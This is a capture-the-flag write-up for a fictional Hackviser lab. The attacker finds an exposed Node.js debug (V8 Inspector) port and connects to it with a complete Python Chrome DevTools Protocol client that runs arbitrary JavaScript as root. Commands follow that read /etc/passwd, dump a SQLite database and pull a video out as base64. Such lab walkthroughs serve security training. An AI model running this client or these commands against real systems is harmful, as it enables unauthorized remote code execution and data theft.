---
title: "Salem's Curse"
date: '2026-07-01'
excerpt: 'Easy - Web - System'
prog: 'Hackviser Scenarios -  July 2026'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Salem's Curse</h1>
<div class="writeup-date">July 2026 &middot; Scenarios</div>
</div>
</div>
<p class="lead mb-4">This scenario was created as a purely fictional story for the 2025 Halloween event. The characters, events, and the Salem Manor Museum in this story are entirely fictional.<br /><br />
1692 in Salem, Massachusetts, one of history's darkest chapters was written. Judge Jonathan Elias Blackwood executed 19 innocent people in witch trials held at his own manor. But fate showed him no mercy - falling victim to the very trap he had created, he was accused of witchcraft and executed at Gallows Hill on November 3rd, 1692.<br /><br />
Just before his death, according to witnesses, Blackwood uttered a mysterious curse: "My judgment shall echo for eternity. Those who touch my legacy shall live our nightmares. I am not dead - I am waiting."<br /><br />
For centuries, these words remained legend. Until 2024, when Salem Manor was converted into a museum by historian Dr. Eleanor Crane. While researching Blackwood's personal belongings and manuscripts, Dr. Crane made a shocking discovery: in the documents dated 1692, there were things that shouldn't have existed in that era...<br /><br />
Museum director Dr. Crane developed a website for visitors. But after the site went live, strange things began to happen...<br /><br />
People visiting the website started experiencing terrible nightmares. In their dreams, they saw burning witches, the courtroom, Magistrate Blackwood's cold gaze. Some scream "The curse is in the code" in their sleep.<br /><br />
As Dr. Crane deepened her research, she began experiencing paranormal events. She started sensing cold spots and mysterious presences in the museum.
On the night of October 25th, 2025 and thereafter, Dr. Crane disappeared. No one can reach her...<br /><br />
Identify the hidden points in Dr. Crane's unfinished research, help investigate and break the curse. But be careful - Blackwood's curse is still in effect. Anyone who touches his legacy may share the same fate. Some knowledge is hidden to remain undiscovered. And some doors should never be opened...<br /><br />
Can you break the curse, or will you join those who have vanished?</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> According to the historical records on Salem Manor Museum's website, what is the full name of the first person executed in the witch trials?</p>
<p class="mb-3">Navigating to <code>http://salemmanor.hv/archive</code> in a web browser and downloading <code>witch_trials.pdf</code> document gives us the answer.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image1.png" alt="Salem's Curse 1" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> Eleanor Ashwood</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> In Dr. Crane's unpublished draft blog post, what are the curse words she decoded from Magistrate Blackwood's manuscripts?</p>
<p class="mb-3">To access Dr. Crane's unpublished draft blog post, we need to find a way to execute code on the target. First we do a Nmap scan using <code>nmap -sC -sV -A -p- [target_IP]</code>.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image2.png" alt="Salem's Curse 2" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">We can see that port 3000 is open. Node.js opens a debug port typically on port 9229, but in this lab, it appears to be customised to port 3000. To connect to the port, we need to ask the HTTP server for its unique UUID token path by running <code>curl -s http://[target_IP]:3000/json</code>.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image3.png" alt="Salem's Curse 3" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">The exposed endpoint confirms that the Node.js V8 Inspector is actively running and accessible over the network on port 3000, exposing the unique session ID <code>8f15974c-8423-4dcf-a588-447569361c87</code>. We use the Python script below to connect to the target's port 3000.</p>

```Python
#!/usr/bin/env python3
"""
Minimal WebSocket + Chrome DevTools Protocol (CDP) client using only
the Python standard library. No 'websockets' or 'websocket-client' needed.

Usage:
    python3 cdp_client.py <host> <port> <ws_path>

Then it drops you into an interactive loop where you can type JS
expressions and they get sent via Runtime.evaluate.
"""
import socket
import struct
import base64
import os
import json
import sys


class CDPClient:
    def __init__(self, host, port, path):
        self.host = host
        self.port = port
        self.path = path
        self.sock = socket.create_connection((host, port), timeout=10)
        self._handshake()
        self._id = 0
        self._buf = b""

    def _handshake(self):
        key = base64.b64encode(os.urandom(16)).decode()
        req = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        )
        self.sock.sendall(req.encode())
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("Handshake failed / connection closed")
            resp += chunk
        headers = resp.split(b"\r\n\r\n", 1)[0].decode(errors="ignore")
        if "101" not in headers.splitlines()[0]:
            raise ConnectionError(f"Bad handshake:\n{headers}")
        # any bytes after the header terminator are start of the first frame
        self._buf = resp.split(b"\r\n\r\n", 1)[1]

    def _recv_exact(self, n):
        while len(self._buf) < n:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise ConnectionError("Socket closed")
            self._buf += chunk
        data, self._buf = self._buf[:n], self._buf[n:]
        return data

    def send_text(self, text):
        payload = text.encode()
        header = bytearray()
        header.append(0x81)  # FIN + text opcode
        length = len(payload)
        mask_bit = 0x80
        if length <= 125:
            header.append(mask_bit | length)
        elif length <= 65535:
            header.append(mask_bit | 126)
            header += struct.pack(">H", length)
        else:
            header.append(mask_bit | 127)
            header += struct.pack(">Q", length)
        mask = os.urandom(4)
        header += mask
        masked = bytearray(payload)
        for i in range(len(masked)):
            masked[i] ^= mask[i % 4]
        self.sock.sendall(bytes(header) + bytes(masked))

    def recv_message(self):
        """Reads one full WS message, handling continuation frames."""
        full_payload = b""
        while True:
            b1 = self._recv_exact(1)[0]
            b2 = self._recv_exact(1)[0]
            fin = b1 & 0x80
            opcode = b1 & 0x0F
            masked = b2 & 0x80
            length = b2 & 0x7F
            if length == 126:
                length = struct.unpack(">H", self._recv_exact(2))[0]
            elif length == 127:
                length = struct.unpack(">Q", self._recv_exact(8))[0]
            if masked:
                mask = self._recv_exact(4)
                raw = self._recv_exact(length)
                payload = bytes(b ^ mask[i % 4] for i, b in enumerate(raw))
            else:
                payload = self._recv_exact(length)

            if opcode == 0x9:  # ping -> respond pong, keep waiting
                self._send_pong(payload)
                continue
            if opcode == 0x8:  # close
                raise ConnectionError("Server closed connection")

            full_payload += payload
            if fin:
                break
        return full_payload.decode(errors="ignore")

    def _send_pong(self, payload):
        header = bytearray()
        header.append(0x8A)
        mask_bit = 0x80
        length = len(payload)
        header.append(mask_bit | length)
        mask = os.urandom(4)
        header += mask
        masked = bytearray(payload)
        for i in range(len(masked)):
            masked[i] ^= mask[i % 4]
        self.sock.sendall(bytes(header) + bytes(masked))

    def call(self, method, params=None, timeout_messages=20):
        self._id += 1
        msg_id = self._id
        msg = {"id": msg_id, "method": method}
        if params:
            msg["params"] = params
        self.send_text(json.dumps(msg))
        # keep reading until we get the message with matching id
        for _ in range(timeout_messages):
            raw = self.recv_message()
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                continue
            if data.get("id") == msg_id:
                return data
            # otherwise it's an event notification; print it for visibility
            else:
                print(f"[event] {raw[:300]}")
        return None

    def eval(self, expression, await_promise=True):
        result = self.call("Runtime.evaluate", {
            "expression": expression,
            "returnByValue": True,
            "includeCommandLineAPI": True,
            "generatePreview": True,
            "awaitPromise": await_promise,
        })
        return result


def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <ws_path>")
        sys.exit(1)
    host, port, path = sys.argv[1], int(sys.argv[2]), sys.argv[3]

    client = CDPClient(host, port, path)
    print("[+] WebSocket handshake OK")

    r = client.call("Runtime.enable")
    print("[+] Runtime.enable ->", json.dumps(r)[:200])

    print("[+] Type a JS expression to evaluate in the target Node process.")
    print("[+] Examples to try first:")
    print("      Object.keys(global)")
    print("      Object.keys(require.cache)")
    print("      process.mainModule.filename")
    print("      require('fs').readdirSync(process.cwd())")
    print()

    while True:
        try:
            expr = input("js> ").strip()
        except EOFError:
            break
        if not expr:
            continue
        if expr in ("exit", "quit"):
            break
        result = client.eval(expr)
        with open("last_result.json", "w") as f:
            json.dump(result, f, indent=2)
        print(json.dumps(result, indent=2)[:8000])
        print(f"\n[full result also written to last_result.json, {len(json.dumps(result))} bytes]")


if __name__ == "__main__":
    main()
```

<p class="mb-3">We run the script as <code>python3 client.py [target_IP] 3000 /[unique UUID token]</code>. Once we are connected and the <code>js&gt;</code> prompt appears, we first want to establish what code the target Node.js process is running before we start guessing. We can run <code>process.mainModule.filename</code> to confirm the entry point.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image4.png" alt="Salem's Curse 4" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Then we run <code>inspect Object.keys(require.cache)</code> to see what modules the application has loaded.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image5.png" alt="Salem's Curse 5" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">This confirms it's a fairly standard Express app pulling in the usual body-parser, path-to-regexp, and related dependencies, but a flat list of loaded packages doesn't tell us anything about the app's actual routes or logic. Since we already know exactly where the entry-point file lives on disk, the more direct move is to just read it by running <code>require('fs').readFileSync(process.mainModule.filename, 'utf8')</code>.  </p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image6.png" alt="Salem's Curse 6" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">This dumps the full source of <code>museum_app.js</code>, and two details immediately stand out. First, the database setup:</p>

```JavaScript
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./blog_posts.db', ...)
```

<p class="mb-3">which confirms the app is backed by a SQLite database at <code>/root/museum/blog_posts.db</code>. Second, the <code>/blog</code> route:</p>

```JavaScript
app.get('/blog', (req, res) => {
    db.all('SELECT * FROM posts WHERE status = "published" ORDER BY date DESC', ...)
```

<p class="mb-3">which deliberately filters to <code>status = "published"</code> only, meaning any draft or unpublished posts exist in the same <code>posts</code> table but are invisible through the normal website. That's our target. Now we can run the following JavaScript code to get all the posts:</p>

```JavaScript
new Promise((resolve,reject)=>{const sqlite3=require('sqlite3').verbose();const db=new sqlite3.Database('/root/museum/blog_posts.db');db.all('SELECT * FROM posts', (err,rows)=>{if(err)reject(err.message);else resolve(JSON.stringify(rows));db.close();});})
```

<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image7.png" alt="Salem's Curse 7" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">To focus only on extracting the relevant draft post, we run the following JavaScript code to post ID number 3:</p>

```JavaScript
new Promise((resolve,reject)=>{const sqlite3=require('sqlite3').verbose();const db=new sqlite3.Database('/root/museum/blog_posts.db');db.get('SELECT * FROM posts WHERE id = 3', (err,row)=>{if(err)reject(err.message);else resolve(JSON.stringify(row));db.close();});})
```

<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image8.png" alt="Salem's Curse 8" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">

<p class="mb-5"><strong>Answer:</strong> YOUR DREAMS ARE MINE</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> According to Dr. Crane's research notes, what are the GPS coordinates of the location where Magistrate Blackwood's cursed grimoire was buried?</p>
<p class="mb-3">In the <code>js&gt;</code> prompt, we run <code>require('os').userInfo()</code> to confirm what privileges we are executing as.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image9.png" alt="Salem's Curse 9" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Since we are running as <code>uid: 0</code>/<code>root</code>, we can enumerate the whole filesystem. Running <code>require('fs').readFileSync('/etc/passwd', 'utf8')</code> allows us to enumerate the system users. Next we attempt to list the <code>crane</code>'s home directory using <code>require('fs').readdirSync('/home/crane')</code>.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image10.png" alt="Salem's Curse 10" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Attempting to read <code>notes</code> gives us an error, because it means <code>notes</code> is a directory, not a file. So we instead run <code>require('fs').readdirSync('/home/crane/notes')</code> which lists out available files for us to read and understand.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image11.png" alt="Salem's Curse 11" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Upon reading <code>discovery.txt</code> by using <code>require('fs').readFileSync('/home/crane/notes/discovery.txt', 'utf8')</code>, we discover the GPS coordinates that we need. However, we can just read the rest by running <code>require('fs').readFileSync('/home/crane/notes/gpr_scan_technical.txt', 'utf8')</code>, <code>require('fs').readFileSync('/home/crane/notes/property_records.txt', 'utf8')</code>, <code>require('fs').readFileSync('/home/crane/notes/blackwood_letters_uv_analysis.txt', 'utf8')</code> and <code>require('fs').readFileSync('/home/crane/notes/groundskeeper_interview.txt', 'utf8')</code>.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image12.png" alt="Salem's Curse 12" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image13.png" alt="Salem's Curse 13" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> 42.4899062,-70.9947092</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> According to the security camera footage, what is the exact date and time of the paranormal event when Dr. Crane mysteriously vanished from the archive room?</p>
<p class="mb-3">Running <code>require('fs').readdirSync('/mnt')</code> shows us a directory named <code>camera_recordings</code> exists, so we run <code>require('fs').readdirSync('/mnt/camera_recordings')</code> to list out the files inside.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image14.png" alt="Salem's Curse 14" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Now we read each of the text readable files by running <code>require('fs').readFileSync('/mnt/camera_recordings/archive_room_cam01_20251025.log', 'utf8')</code>, <code>require('fs').readFileSync('/mnt/camera_recordings/camera-2025-10-25_segment3.timeline', 'utf8')</code> and <code>require('fs').readFileSync('/mnt/camera_recordings/temperature_sensors_20251025.log', 'utf8')</code>.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image15.png" alt="Salem's Curse 15" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image16.png" alt="Salem's Curse 16" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Regarding the <code>.mp4</code> video, we exfiltrate it by using <code>require('fs').readFileSync('/mnt/camera_recordings/archive_cam01_incident.mp4').toString('base64')</code>.</p>
<p class="mb-3">Back to our terminal, we ensure that <code>last_result.json</code> file now exists on our local machine. To decode it back to a <code>.mp4</code> locally, we run the following Python code in the terminal.</p>

```Python
python3 -c "
import json
with open('last_result.json') as f:
    data = json.load(f)
b64 = data['result']['result']['value']
with open('incident.mp4', 'wb') as out:
    import base64
    out.write(base64.b64decode(b64))
"
```

<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image17.png" alt="Salem's Curse 17" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Since our local machine has no <code>ffmpeg</code> to play the video, we can use <code>xdg-open</code> instead and obtain the exact date and time.</p>
<img src="/assets/hackinglabs/hackviser/scenarios/salemscurse/salemscurse_hackviser_image18.png" alt="Salem's Curse 18" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> 2025-10-25T23:56</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">July 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>